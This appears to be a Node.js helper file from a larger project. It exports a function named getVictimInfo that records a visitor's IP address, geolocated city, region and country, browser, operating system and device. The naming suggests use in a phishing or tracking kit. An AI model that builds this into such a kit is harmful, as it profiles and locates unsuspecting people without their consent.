// utils/helpers.js
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');

async function getVictimInfo(req) {
    try {
        const ip = requestIp.getClientIp(req) || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const agent = useragent.parse(userAgent);
        
        let location = 'Unknown';
        try {
            const geo = geoip.lookup(ip);
            if (geo) {
                location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
            }
        } catch (e) {
            // Ignore geo lookup errors
        }

        return {
            ip,
            location,
            browser: agent.toAgent() || 'Unknown',
            os: agent.os.toString() || 'Unknown',
            device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
            timestamp: new Date().toLocaleString()
        };
    } catch (err) {
        return {
            ip: 'Unknown',
            location: 'Unknown',
            browser: 'Unknown',
            os: 'Unknown',
            device: 'Unknown',
            timestamp: new Date().toLocaleString()
        };
    }
}

module.exports = { getVictimInfo };